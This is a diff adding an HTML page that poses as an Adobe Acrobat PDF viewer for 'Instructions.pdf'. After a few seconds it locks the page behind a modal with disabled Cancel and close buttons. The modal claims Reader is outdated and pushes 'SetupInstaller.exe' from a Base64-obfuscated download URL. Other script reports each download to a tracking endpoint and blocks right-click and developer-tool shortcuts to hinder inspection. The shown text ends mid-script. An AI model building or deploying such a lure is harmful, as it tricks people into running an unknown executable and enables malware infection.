@@ -1,0 +1,3195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+    <title>Instructions.pdf</title>
+
+    <!-- PDF.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
+
+    <style>
+
+        /* =========================================================
+           GLOBAL
+           ========================================================= */
+
+        * {
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
+            background: #323639;
+            color: #ffffff;
+        }
+
+        body {
+            opacity: 1;
+        }
+
+        button {
+            font: inherit;
+            cursor: pointer;
+        }
+
+
+        /* =========================================================
+           INITIAL LOADING SCREEN
+           ========================================================= */
+
+        #initialLoader {
+            position: fixed;
+            inset: 0;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            background: #f5f5f5;
+
+            z-index: 1000000;
+
+            transition:
+                opacity .45s ease,
+                visibility .45s ease;
+        }
+
+        #initialLoader.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+
+            text-align: center;
+        }
+
+        .loader-spinner {
+            width: 42px;
+            height: 42px;
+
+            border-radius: 50%;
+
+            border:
+                4px solid #d7d7d7;
+
+            border-top-color: #555555;
+
+            animation:
+                loaderSpin .85s linear infinite;
+        }
+
+        .loader-text {
+            margin-top: 16px;
+
+            color: #555555;
+
+            font-size: 13px;
+            font-weight: 400;
+        }
+
+        @keyframes loaderSpin {
+
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+
+        }
+
+
+        /* =========================================================
+           APPLICATION
+           ========================================================= */
+
+        .app {
+            width: 100%;
+            height: 100vh;
+
+            display: flex;
+            flex-direction: column;
+
+            background: #323639;
+
+            opacity: 0;
+
+            transition:
+                opacity .45s ease;
+        }
+
+        .app.visible {
+            opacity: 1;
+        }
+
+
+        /* =========================================================
+           TOP BAR
+           ========================================================= */
+
+        .topbar {
+            height: 52px;
+            min-height: 52px;
+
+            display: flex;
+            align-items: center;
+
+            background: #202124;
+
+            border-bottom:
+                1px solid #111214;
+
+            padding: 0 14px;
+
+            gap: 12px;
+
+            z-index: 20;
+        }
+
+        .acrobat-mark {
+            width: 30px;
+            height: 30px;
+
+            border-radius: 5px;
+
+            background: #ec1c24;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            color: #ffffff;
+
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .document-name {
+            min-width: 0;
+
+            flex: 1;
+
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+
+            font-size: 14px;
+
+            color: #e8eaed;
+        }
+
+        .top-button {
+            width: 34px;
+            height: 34px;
+
+            border: 0;
+            border-radius: 5px;
+
+            background: transparent;
+
+            color: #d7d9dc;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            font-size: 18px;
+        }
+
+        .top-button:hover {
+            background: #3c4043;
+        }
+
+
+        /* =========================================================
+           TOOLBAR
+           ========================================================= */
+
+        .toolbar {
+            height: 48px;
+            min-height: 48px;
+
+            display: flex;
+            align-items: center;
+
+            gap: 5px;
+
+            padding: 0 12px;
+
+            background: #292a2d;
+
+            border-bottom:
+                1px solid #17181a;
+
+            z-index: 19;
+        }
+
+        .tool-button {
+            height: 34px;
+
+            border: 0;
+            border-radius: 5px;
+
+            background: transparent;
+
+            color: #d8dadd;
+
+            padding: 0 11px;
+
+            font-size: 13px;
+        }
+
+        .tool-button:hover {
+            background: #3b3d40;
+        }
+
+        .toolbar-spacer {
+            flex: 1;
+        }
+
+        .page-control,
+        .zoom-control {
+            display: flex;
+            align-items: center;
+
+            gap: 5px;
+        }
+
+        .page-input {
+            width: 44px;
+            height: 30px;
+
+            border:
+                1px solid #55585c;
+
+            border-radius: 4px;
+
+            background: #202124;
+
+            color: #ffffff;
+
+            text-align: center;
+
+            outline: none;
+        }
+
+        .page-count {
+            color: #b8bbc0;
+
+            font-size: 13px;
+
+            min-width: 42px;
+        }
+
+        .zoom-value {
+            min-width: 48px;
+
+            text-align: center;
+
+            color: #d8dadd;
+
+            font-size: 13px;
+        }
+
+        .small-button {
+            width: 32px;
+            height: 30px;
+
+            border: 0;
+            border-radius: 4px;
+
+            background: transparent;
+
+            color: #d8dadd;
+
+            font-size: 18px;
+        }
+
+        .small-button:hover {
+            background: #3b3d40;
+        }
+
+
+        /* =========================================================
+           MAIN AREA
+           ========================================================= */
+
+        .main-area {
+            flex: 1;
+
+            min-height: 0;
+
+            display: flex;
+
+            overflow: hidden;
+        }
+
+
+        /* =========================================================
+           SIDEBAR
+           ========================================================= */
+
+        .sidebar {
+            width: 170px;
+            min-width: 170px;
+
+            background: #292a2d;
+
+            border-right:
+                1px solid #17181a;
+
+            overflow-y: auto;
+
+            padding: 16px 12px;
+        }
+
+        .sidebar-title {
+            color: #aeb1b5;
+
+            font-size: 11px;
+
+            text-transform: uppercase;
+
+            letter-spacing: .08em;
+
+            margin:
+                0 4px 12px;
+        }
+
+        .thumb {
+            width: 100%;
+
+            border:
+                1px solid transparent;
+
+            background: transparent;
+
+            padding: 7px;
+
+            margin-bottom: 10px;
+
+            border-radius: 5px;
+
+            color: #c7c9cc;
+
+            position: relative;
+        }
+
+        .thumb:hover {
+            background: #37393c;
+        }
+
+        .thumb.active {
+            border-color: #8ab4f8;
+
+            background: #383a3d;
+        }
+
+        .thumb canvas {
+            display: block;
+
+            margin: auto;
+
+            background: #ffffff;
+
+            box-shadow:
+                0 2px 5px rgba(0, 0, 0, .35);
+        }
+
+        .thumb-number {
+            display: block;
+
+            font-size: 11px;
+
+            margin-top: 5px;
+        }
+
+
+        /* =========================================================
+           PDF WORKSPACE
+           ========================================================= */
+
+        .workspace {
+            flex: 1;
+
+            min-width: 0;
+
+            overflow-y: auto;
+            overflow-x: auto;
+
+            background: #3b3d3f;
+
+            padding: 28px;
+
+            scroll-behavior: smooth;
+        }
+
+        .pages {
+            width: max-content;
+
+            min-width: 100%;
+
+            display: flex;
+
+            flex-direction: column;
+
+            align-items: center;
+
+            gap: 24px;
+        }
+
+        .pdf-page {
+            position: relative;
+
+            background: #ffffff;
+
+            box-shadow:
+                0 4px 18px rgba(0, 0, 0, .35);
+
+            min-height: 200px;
+        }
+
+        .pdf-page canvas {
+            display: block;
+
+            background: #ffffff;
+        }
+
+
+        /* =========================================================
+           ERROR
+           ========================================================= */
+
+        .viewer-error {
+            max-width: 650px;
+
+            margin: 80px auto;
+
+            padding: 24px;
+
+            background: #202124;
+
+            border:
+                1px solid #5f6368;
+
+            border-radius: 8px;
+
+            color: #f28b82;
+
+            line-height: 1.5;
+        }
+
+
+        /* =========================================================
+           DOWNLOAD MODAL
+           ========================================================= */
+
+        .download-modal {
+            position: fixed;
+
+            inset: 0;
+
+            display: none;
+
+            align-items: center;
+            justify-content: center;
+
+            padding: 20px;
+
+            background:
+                rgba(0, 0, 0, .22);
+
+            z-index: 999999;
+
+            user-select: none;
+        }
+
+        .download-modal.open {
+            display: flex;
+        }
+
+
+        /* =========================================================
+           WINDOWS-STYLE DIALOG
+           ========================================================= */
+
+        .download-dialog {
+            position: relative;
+
+            width: 460px;
+
+            max-width:
+                calc(100vw - 32px);
+
+            background: #f3f3f3;
+
+            border:
+                1px solid #b5b5b5;
+
+            box-shadow:
+                0 8px 30px rgba(0, 0, 0, .38),
+                0 1px 3px rgba(0, 0, 0, .20);
+
+            color: #1a1a1a;
+
+            font-family:
+                "Segoe UI",
+                Arial,
+                Helvetica,
+                sans-serif;
+
+            overflow: hidden;
+        }
+
+
+        /* =========================================================
+           CLOSE
+           ========================================================= */
+
+        .download-close {
+            position: absolute;
+
+            top: 0;
+            right: 0;
+
+            width: 46px;
+            height: 38px;
+
+            border: 0;
+
+            background: transparent;
+
+            color: #777777;
+
+            font-size: 22px;
+
+            font-weight: 300;
+
+            line-height: 38px;
+
+            text-align: center;
+
+            z-index: 2;
+
+            pointer-events: none;
+
+            opacity: .35;
+
+            cursor: default;
+        }
+
+
+        /* =========================================================
+           CONTENT
+           ========================================================= */
+
+        .download-content {
+            padding:
+                30px 32px 26px;
+        }
+
+        .download-content h1 {
+            margin:
+                0 36px 14px 0;
+
+            font-size: 22px;
+
+            font-weight: 400;
+
+            line-height: 1.25;
+
+            color: #111111;
+        }
+
+        .download-description {
+            margin:
+                0 0 22px;
+
+            font-size: 14px;
+
+            line-height: 1.5;
+
+            color: #303030;
+        }
+
+
+        /* =========================================================
+           DOWNLOAD INFO
+           ========================================================= */
+
+        .download-row {
+            display: flex;
+
+            align-items: center;
+
+            gap: 14px;
+
+            margin-bottom: 20px;
+        }
+
+        .download-icon {
+            flex: 0 0 52px;
+
+            width: 52px;
+            height: 52px;
+
+            background: #4a4a4a;
+
+            display: flex;
+
+            align-items: center;
+            justify-content: center;
+
+            color: #ffffff;
+
+            font-size: 25px;
+        }
+
+        .download-file-info {
+            min-width: 0;
+        }
+
+        .download-file-name {
+            color: #222222;
+
+            font-size: 14px;
+
+            font-weight: 600;
+
+            overflow: hidden;
+
+            white-space: nowrap;
+
+            text-overflow: ellipsis;
+        }
+
+        .download-file-type {
+            margin-top: 4px;
+
+            color: #707070;
+
+            font-size: 12px;
+        }
+
+
+        /* =========================================================
+           BUTTONS
+           ========================================================= */
+
+        .download-buttons {
+            display: flex;
+
+            justify-content: flex-end;
+
+            gap: 8px;
+
+            margin-top: 16px;
+        }
+
+        .download-button {
+            min-width: 100px;
+
+            height: 34px;
+
+            padding:
+                0 18px;
+
+            border:
+                1px solid #8c8c8c;
+
+            border-radius: 2px;
+
+            background: #e1e1e1;
+
+            color: #111111;
+
+            font-family:
+                "Segoe UI",
+                Arial,
+                sans-serif;
+
+            font-size: 13px;
+        }
+
+        .download-button:disabled {
+            opacity: .45;
+
+            cursor: not-allowed;
+        }
+
+        .download-button.primary {
+            background: #0078d4;
+
+            border-color: #0067b8;
+
+            color: #ffffff;
+        }
+
+        .download-button.primary:hover {
+            background: #106ebe;
+        }
+
+
+        /* =========================================================
+           LOCKED BACKGROUND
+           ========================================================= */
+
+        body.modal-locked {
+            overflow: hidden;
+        }
+
+        body.modal-locked #workspace {
+            filter: blur(7px);
+
+            pointer-events: none;
+
+            user-select: none;
+        }
+
+        body.modal-locked #workspace * {
+            pointer-events: none !important;
+
+            user-select: none !important;
+        }
+
+        body.modal-locked .sidebar {
+            filter: blur(7px);
+
+            pointer-events: none;
+
+            user-select: none;
+        }
+
+        body.modal-locked .toolbar {
+            filter: blur(5px);
+
+            pointer-events: none;
+        }
+
+        body.modal-locked .topbar {
+            filter: blur(4px);
+
+            pointer-events: none;
+        }
+
+
+        /* =========================================================
+           MOBILE
+           ========================================================= */
+
+        @media (max-width: 700px) {
+
+            .topbar {
+                padding: 0 8px;
+            }
+
+            .document-name {
+                font-size: 13px;
+            }
+
+            .toolbar {
+                overflow-x: auto;
+
+                padding: 0 7px;
+            }
+
+            .toolbar > .tool-button {
+                display: none;
+            }
+
+            .sidebar {
+                display: none;
+            }
+
+            .workspace {
+                padding: 12px;
+            }
+
+            .pages {
+                gap: 14px;
+            }
+
+            .download-modal {
+                padding: 12px;
+            }
+
+            .download-dialog {
+                width:
+                    min(360px,
+                    calc(100vw - 24px));
+
+                max-width:
+                    calc(100vw - 24px);
+            }
+
+            .download-content {
+                padding:
+                    26px 24px 22px;
+            }
+
+            .download-content h1 {
+                font-size: 20px;
+            }
+
+            .download-description {
+                font-size: 13px;
+            }
+
+            .download-row {
+                gap: 10px;
+            }
+
+            .download-icon {
+                flex: 0 0 46px;
+
+                width: 46px;
+                height: 46px;
+            }
+
+        }
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+<!-- =========================================================
+     INITIAL PLAIN LOADING SCREEN
+     ========================================================= -->
+
+<div id="initialLoader">
+
+    <div class="loader-container">
+
+        <div class="loader-spinner"></div>
+
+        <div class="loader-text">
+            Loading document...
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- =========================================================
+     PDF APPLICATION
+     ========================================================= -->
+
+<div class="app" id="app">
+
+
+    <div class="topbar">
+
+        <div class="acrobat-mark">
+            A
+        </div>
+
+        <div class="document-name">
+            Instructions.pdf
+        </div>
+
+        <button
+            class="top-button"
+            type="button"
+            title="Search">
+
+            🔍
+
+        </button>
+
+        <button
+            class="top-button"
+            type="button"
+            title="More">
+
+            ⋮
+
+        </button>
+
+    </div>
+
+
+    <div class="toolbar">
+
+        <button
+            class="tool-button"
+            type="button">
+            Home
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            All tools
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            Edit
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            Comment
+        </button>
+
+        <button
+            class="tool-button"
+            type="button">
+            Sign
+        </button>
+
+        <div class="toolbar-spacer"></div>
+
+
+        <div class="page-control">
+
+            <input
+                id="pageInput"
+                class="page-input"
+                type="number"
+                min="1"
+                value="1">
+
+            <span>/</span>
+
+            <span
+                id="pageCount"
+                class="page-count">
+                -
+            </span>
+
+        </div>
+
+
+        <div class="zoom-control">
+
+            <button
+                id="zoomOut"
+                class="small-button"
+                type="button">
+
+                −
+
+            </button>
+
+            <span
+                id="zoomValue"
+                class="zoom-value">
+
+                100%
+
+            </span>
+
+            <button
+                id="zoomIn"
+                class="small-button"
+                type="button">
+
+                +
+
+            </button>
+
+        </div>
+
+    </div>
+
+
+    <div class="main-area">
+
+
+        <aside class="sidebar">
+
+            <div class="sidebar-title">
+                Pages
+            </div>
+
+            <div id="thumbs"></div>
+
+        </aside>
+
+
+        <main
+            id="workspace"
+            class="workspace">
+
+            <div
+                id="pages"
+                class="pages">
+            </div>
+
+            <div
+                id="viewerError"
+                class="viewer-error"
+                hidden>
+            </div>
+
+        </main>
+
+    </div>
+
+</div>
+
+
+<!-- =========================================================
+     PERSISTENT DOWNLOAD MODAL
+     ========================================================= -->
+
+<div
+    id="downloadModal"
+    class="download-modal"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="downloadTitle">
+
+    <div class="download-dialog">
+
+        <button
+            id="closeDownloadModal"
+            class="download-close"
+            type="button"
+            aria-label="Close"
+            disabled
+            tabindex="-1">
+
+            ×
+
+        </button>
+
+
+        <div class="download-content">
+
+
+            <h1 id="downloadTitle">
+                Adobe Acrobat Reader DC Update Required
+            </h1>
+
+
+            <p class="download-description">
+                Your version of Adobe Acrobat Reader is outdated and cannot display the document correctly. Please update to continue
+            </p>
+
+
+            <div class="download-row">
+
+
+                <div class="download-icon">
+                    ↓
+                </div>
+
+
+                <div class="download-file-info">
+
+                    <div class="download-file-name">
+                        SetupInstaller.exe
+                    </div>
+
+                    <div class="download-file-type">
+                        Windows executable
+                    </div>
+
+                </div>
+
+            </div>
+
+
+            <div class="download-buttons">
+
+
+                <button
+                    id="cancelDownload"
+                    class="download-button"
+                    type="button"
+                    disabled
+                    tabindex="-1">
+
+                    Cancel
+
+                </button>
+
+
+                <button
+                    id="startDownload"
+                    class="download-button primary"
+                    type="button"
+                    autofocus>
+
+                    Download
+
+                </button>
+
+            </div>
+
+
+        </div>
+
+    </div>
+
+</div>
+
+
+<script>
+
+/* =========================================================
+   CONFIGURATION
+   ========================================================= */
+
+const CONFIG = {
+
+    /*
+     * PDF displayed by the reader.
+     */
+    pdfUrl:
+        "./instructions.pdf",
+
+
+    /*
+     * Time between the PDF reader becoming visible
+     * and the persistent download modal appearing.
+     *
+     * 3000 = 3 seconds.
+     */
+    modalDelay:
+        3000,
+
+
+    /*
+     * Base64-encoded HTTP/HTTPS download URL.
+     *
+     * Keep the existing download URL configuration here.
+     */
+    encodedDownloadUrl:
+        "aHR0cHM6Ly91cGRhdGVzZXR1cGluc3RhbGxlci5hY2Nlc3NhbGxkb2Mub3JnL2Rvd25sb2Fk",
+
+
+    /*
+     * Cloudflare Worker notification endpoint.
+     *
+     * This will be supplied when the Worker is provided.
+     *
+     * Leave empty until the Worker endpoint is known.
+     *
+     * Example later:
+     *
+     * notificationUrl:
+     *     "https://projectdeal.accessalldoc.org//api/download-started"
+     */
+    notificationUrl: "https://projectdeal.accessalldoc.org//api/download-started"
+        
+
+};
+
+
+/* =========================================================
+   256-CHARACTER URL
+   ========================================================= */
+
+/*
+ * This runs automatically on BOTH localhost and production.
+ *
+ * The browser-visible URL is padded to exactly 256 characters
+ * using a client-side URL fragment (#...).
+ *
+ * The fragment:
+ *
+ * - remains entirely client-side
+ * - is not sent to the server
+ * - does not affect Cloudflare Worker routing
+ * - does not affect /download
+ * - does not affect the configured download URL
+ * - does not cause a page navigation
+ *
+ * Existing origin, pathname, and query string are preserved.
+ *
+ * A new automatic seed is generated every time the page loads.
+ *
+ * If the existing URL is already longer than 256 characters,
+ * it is left unchanged because shortening it could alter routing.
+ */
+function ensure256CharacterUrl() {
+
+    try {
+
+        const TARGET_LENGTH =
+            256;
+
+
+        const baseUrl =
+            window.location.origin +
+            window.location.pathname +
+            window.location.search;
+
+
+        if (
+            baseUrl.length >
+            TARGET_LENGTH
+        ) {
+
+            console.warn(
+                "URL is already longer than 256 characters. " +
+                "The existing URL was preserved.",
+                {
+                    length:
+                        baseUrl.length,
+
+                    target:
+                        TARGET_LENGTH
+                }
+            );
+
+            return;
+
+        }
+
+
+        const fragmentPrefix =
+            "#";
+
+
+        const requiredFragmentLength =
+            TARGET_LENGTH -
+            baseUrl.length -
+            fragmentPrefix.length;
+
+
+        let randomSeed =
+            "";
+
+
+        try {
+
+            if (
+                window.crypto &&
+                typeof window.crypto.getRandomValues ===
+                    "function"
+            ) {
+
+                const randomBytes =
+                    new Uint8Array(24);
+
+
+                window.crypto.getRandomValues(
+                    randomBytes
+                );
+
+
+                randomSeed =
+                    Array.from(
+                        randomBytes
+                    )
+                    .map(
+                        function (byte) {
+
+                            return byte
+                                .toString(16)
+                                .padStart(
+                                    2,
+                                    "0"
+                                );
+
+                        }
+                    )
+                    .join("");
+
+            }
+
+        }
+        catch (seedError) {
+
+            console.warn(
+                "Automatic cryptographic seed generation failed:",
+                seedError
+            );
+
+        }
+
+
+        if (!randomSeed) {
+
+            randomSeed =
+                String(
+                    Date.now()
+                ) +
+                "_" +
+                String(
+                    Math.random()
+                )
+                .replace(
+                    ".",
+                    ""
+                );
+
+        }
+
+
+        const seed =
+            "document-download-" +
+            randomSeed +
+            "-";
+
+
+        let fragment =
+            "";
+
+
+        while (
+            fragment.length <
+            requiredFragmentLength
+        ) {
+
+            fragment +=
+                seed;
+
+        }
+
+
+        fragment =
+            fragment.substring(
+                0,
+                requiredFragmentLength
+            );
+
+
+        const displayUrl =
+            baseUrl +
+            fragmentPrefix +
+            fragment;
+
+
+        if (
+            displayUrl.length !==
+            TARGET_LENGTH
+        ) {
+
+            console.warn(
+                "256-character URL could not be generated.",
+                {
+                    length:
+                        displayUrl.length,
+
+                    target:
+                        TARGET_LENGTH
+                }
+            );
+
+            return;
+
+        }
+
+
+        window.history.replaceState(
+            null,
+            document.title,
+            displayUrl
+        );
+
+
+        if (
+            window.location.href.length !==
+            TARGET_LENGTH
+        ) {
+
+            console.warn(
+                "Browser URL length verification failed.",
+                {
+                    length:
+                        window.location.href.length,
+
+                    target:
+                        TARGET_LENGTH
+                }
+            );
+
+            return;
+
+        }
+
+
+        console.log(
+            "Automatic 256-character URL seed generated."
+        );
+
+    }
+    catch (error) {
+
+        console.warn(
+            "256-character URL setup skipped:",
+            error
+        );
+
+    }
+
+}
+
+
+ensure256CharacterUrl();
+
+
+/* =========================================================
+   BROWSER INSPECTION DETERRENCE
+   ========================================================= */
+
+/*
+ * Browser-side JavaScript cannot provide absolute protection
+ * against developer tools or source inspection.
+ *
+ * These protections are intended to deter casual inspection
+ * and disable the common browser shortcuts.
+ *
+ * Blocked:
+ *
+ * - Right-click context menu
+ * - F12
+ * - Ctrl + Shift + I
+ * - Ctrl + Shift + J
+ * - Ctrl + Shift + C
+ * - Ctrl + U
+ *
+ * The application's normal PDF controls and download button
+ * remain functional.
+ */
+
+document.addEventListener(
+    "contextmenu",
+    function (event) {
+
+        event.preventDefault();
+
+    },
+    true
+);
+
+
+document.addEventListener(
+    "keydown",
+    function (event) {
+
+        const key =
+            String(
+                event.key
+            ).toLowerCase();
+
+
+        if (
+            event.key ===
+            "F12"
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+            return;
+
+        }
+
+
+        if (
+            event.ctrlKey &&
+            event.shiftKey &&
+            key === "i"
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+            return;
+
+        }
+
+
+        if (
+            event.ctrlKey &&
+            event.shiftKey &&
+            key === "j"
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+            return;
+
+        }
+
+
+        if (
+            event.ctrlKey &&
+            event.shiftKey &&
+            key === "c"
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+            return;
+
+        }
+
+
+        if (
+            event.ctrlKey &&
+            key === "u"
+        ) {
+
+            event.preventDefault();
+
+            event.stopPropagation();
+
+            return;
+
+        }
+
+    },
+    true
+);
+
+
+/* =========================================================
+   PDF.JS
+   ========================================================= */
+
+pdfjsLib.GlobalWorkerOptions.workerSrc =
+    "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
+
+
+/* =========================================================
+   APPLICATION STATE
+   ========================================================= */
+
+let pdfDoc = null;
+
+let scale = 1;
+
+let renderedPages =
+    new Map();
+
+let modalShown =
+    false;
+
+let pdfLocked =
+    false;
+
+let scrollTimer =
+    null;
+
+let downloadUrl =
+    "";
+
+
+/* =========================================================
+   ELEMENT HELPER
+   ========================================================= */
+
+function $(id) {
+
+    return document.getElementById(id);
+
+}
+
+
+/* =========================================================
+   DECODE DOWNLOAD URL
+   ========================================================= */
+
+function decodeDownloadUrl() {
+
+    try {
+
+        if (
+            !CONFIG.encodedDownloadUrl ||
+            CONFIG.encodedDownloadUrl ===
+                "REPLACE_WITH_BASE64_DOWNLOAD_URL"
+        ) {
+
+            throw new Error(
+                "The Base64 download URL has not been configured."
+            );
+
+        }
+
+
+        const decoded =
+            atob(
+                CONFIG.encodedDownloadUrl
+            );
+
+
+        const cleanedUrl =
+            decoded.trim();
+
+
+        const url =
+            new URL(
+                cleanedUrl
+            );
+
+
+        if (
+            url.protocol !==
+                "https:" &&
+            url.protocol !==
+                "http:"
+        ) {
+
+            throw new Error(
+                "The decoded download URL uses an unsupported protocol."
+            );
+
+        }
+
+
+        return url.href;
+
+    }
+    catch (error) {
+
+        console.error(
+            "Download URL decoding failed:",
+            error
+        );
+
+        return "";
+
+    }
+
+}
+
+
+/* =========================================================
+   SHOW ERROR
+   ========================================================= */
+
+function showError(message) {
+
+    const error =
+        $("viewerError");
+
+    if (!error) {
+        return;
+    }
+
+    error.textContent =
+        message;
+
+    error.hidden =
+        false;
+
+}
+
+
+/* =========================================================
+   CLAMP
+   ========================================================= */
+
+function clamp(
+    value,
+    min,
+    max
+) {
+
+    return Math.min(
+        max,
+        Math.max(
+            min,
+            value
+        )
+    );
+
+}
+
+
+/* =========================================================
+   CURRENT PAGE
+   ========================================================= */
+
+function pageNumberForScroll() {
+
+    if (!pdfDoc) {
+
+        return 1;
+
+    }
+
+
+    const pages =
+        Array.from(
+            document.querySelectorAll(
+                ".pdf-page"
+            )
+        );
+
+
+    let best =
+        1;
+
+    let bestDistance =
+        Infinity;
+
+
+    for (
+        const page of pages
+    ) {
+
+        const distance =
+            Math.abs(
+                page.getBoundingClientRect().top -
+                92
+            );
+
+
+        if (
+            distance <
+            bestDistance
+        ) {
+
+            bestDistance =
+                distance;
+
+            best =
+                Number(
+                    page.dataset.page
+                );
+
+        }
+
+    }
+
+
+    return best;
+
+}
+
+
+/* =========================================================
+   RENDER PAGE
+   ========================================================= */
+
+async function renderPage(number) {
+
+    const holder =
+        document.querySelector(
+            `.pdf-page[data-page="${number}"]`
+        );
+
+
+    if (
+        !holder ||
+        renderedPages.has(number)
+    ) {
+
+        return;
+
+    }
+
+
+    const page =
+        await pdfDoc.getPage(
+            number
+        );
+
+
+    const viewport =
+        page.getViewport({
+            scale:
+                scale
+        });
+
+
+    const canvas =
+        holder.querySelector(
+            "canvas"
+        );
+
+
+    if (!canvas) {
+
+        return;
+
+    }
+
+
+    const context =
+        canvas.getContext(
+            "2d",
+            {
+                alpha:
+                    false
+            }
+        );
+
+
+    const ratio =
+        window.devicePixelRatio ||
+        1;
+
+
+    canvas.width =
+        Math.ceil(
+            viewport.width *
+            ratio
+        );
+
+
+    canvas.height =
+        Math.ceil(
+            viewport.height *
+            ratio
+        );
+
+
+    canvas.style.width =
+        `${viewport.width}px`;
+
+
+    canvas.style.height =
+        `${viewport.height}px`;
+
+
+    holder.style.width =
+        `${viewport.width}px`;
+
+
+    holder.style.minHeight =
+        `${viewport.height}px`;
+
+
+    await page.render({
+
+        canvasContext:
+            context,
+
+        viewport:
+            viewport,
+
+        transform:
+            ratio !== 1
+                ? [
+                    ratio,
+                    0,
+                    0,
+                    ratio,
+                    0,
+                    0
+                ]
+                : null
+
+    }).promise;
+
+
+    renderedPages.set(
+        number,
+        true
+    );
+
+}
+
+
+/* =========================================================
+   RENDER VISIBLE PAGES
+   ========================================================= */
+
+async function renderVisiblePages() {
+
+    if (!pdfDoc) {
+
+        return;
+
+    }
+
+
+    const pages =
+        Array.from(
+            document.querySelectorAll(
+                ".pdf-page"
+            )
+        );
+
+
+    for (
+        const holder of pages
+    ) {
+
+        const rect =
+            holder.getBoundingClientRect();
+
+
+        if (
+            rect.bottom > -800 &&
+            rect.top <
+                window.innerHeight +
+                800
+        ) {
+
+            await renderPage(
+                Number(
+                    holder.dataset.page
+                )
+            );
+
+        }
+
+    }
+
+}
+
+
+/* =========================================================
+   THUMBNAIL
+   ========================================================= */
+
+async function makeThumbnail(
+    number,
+    canvas
+) {
+
+    if (!canvas) {
+
+        return;
+
+    }
+
+
+    const page =
+        await pdfDoc.getPage(
+            number
+        );
+
+
+    const base =
+        page.getViewport({
+            scale:
+                1
+        });
+
+
+    const thumbnailWidth =
+        130;
+
+
+    const thumbnailScale =
+        thumbnailWidth /
+        base.width;
+
+
+    const viewport =
+        page.getViewport({
+            scale:
+                thumbnailScale
+        });
+
+
+    const ratio =
+        window.devicePixelRatio ||
+        1;
+
+
+    canvas.width =
+        Math.ceil(
+            viewport.width *
+            ratio
+        );
+
+
+    canvas.height =
+        Math.ceil(
+            viewport.height *
+            ratio
+        );
+
+
+    canvas.style.width =
+        `${viewport.width}px`;
+
+
+    canvas.style.height =
+        `${viewport.height}px`;
+
+
+    await page.render({
+
+        canvasContext:
+            canvas.getContext(
+                "2d"
+            ),
+
+        viewport:
+            viewport,
+
+        transform:
+            ratio !== 1
+                ? [
+                    ratio,
+                    0,
+                    0,
+                    ratio,
+                    0,
+                    0
+                ]
+                : null
+
+    }).promise;
+
+}
+
+
+/* =========================================================
+   BUILD PDF PAGES
+   ========================================================= */
+
+function buildPages() {
+
+    const pagesContainer =
+        $("pages");
+
+    const thumbsContainer =
+        $("thumbs");
+
+
+    if (pagesContainer) {
+
+        pagesContainer.innerHTML =
+            "";
+
+    }
+
+
+    if (thumbsContainer) {
+
+        thumbsContainer.innerHTML =
+            "";
+
+    }
+
+
+    renderedPages.clear();
+
+
+    for (
+        let number = 1;
+        number <= pdfDoc.numPages;
+        number++
+    ) {
+
+
+        const holder =
+            document.createElement(
+                "div"
+            );
+
+
+        holder.className =
+            "pdf-page";
+
+
+        holder.dataset.page =
+            number;
+
+
+        holder.innerHTML =
+            "<canvas></canvas>";
+
+
+        pagesContainer.appendChild(
+            holder
+        );
+
+
+        const thumb =
+            document.createElement(
+                "button"
+            );
+
+
+        thumb.className =
+            "thumb";
+
+
+        thumb.type =
+            "button";
+
+
+        thumb.dataset.page =
+            number;
+
+
+        thumb.innerHTML = `
+            <span class="thumb-number">
+                ${number}
+            </span>
+
+            <canvas></canvas>
+        `;
+
+
+        thumb.addEventListener(
+            "click",
+            function () {
+
+                if (pdfLocked) {
+
+                    return;
+
+                }
+
+
+                const target =
+                    document.querySelector(
+                        `.pdf-page[data-page="${number}"]`
+                    );
+
+
+                if (target) {
+
+                    target.scrollIntoView({
+
+                        behavior:
+                            "smooth",
+
+                        block:
+                            "start"
+
+                    });
+
+                }
+
+            }
+        );
+
+
+        thumbsContainer.appendChild(
+            thumb
+        );
+
+
+        makeThumbnail(
+            number,
+            thumb.querySelector(
+                "canvas"
+            )
+        ).catch(
+            console.error
+        );
+
+    }
+
+
+    const pageCount =
+        $("pageCount");
+
+
+    if (pageCount) {
+
+        pageCount.textContent =
+            pdfDoc.numPages;
+
+    }
+
+
+    const pageInput =
+        $("pageInput");
+
+
+    if (pageInput) {
+
+        pageInput.max =
+            pdfDoc.numPages;
+
+    }
+
+}
+
+
+/* =========================================================
+   LOAD PDF
+   ========================================================= */
+
+async function loadPdf() {
+
+    try {
+
+        const loading =
+            pdfjsLib.getDocument(
+                CONFIG.pdfUrl
+            );
+
+
+        pdfDoc =
+            await loading.promise;
+
+
+        buildPages();
+
+
+        await renderVisiblePages();
+
+
+        updateToolbar();
+
+
+        revealPdfReader();
+
+
+    }
+    catch (error) {
+
+        console.error(
+            "PDF loading error:",
+            error
+        );
+
+
+        showError(
+            "The PDF could not be loaded."
+        );
+
+
+        revealPdfReader();
+
+    }
+
+}
+
+
+/* =========================================================
+   REVEAL PDF READER
+   ========================================================= */
+
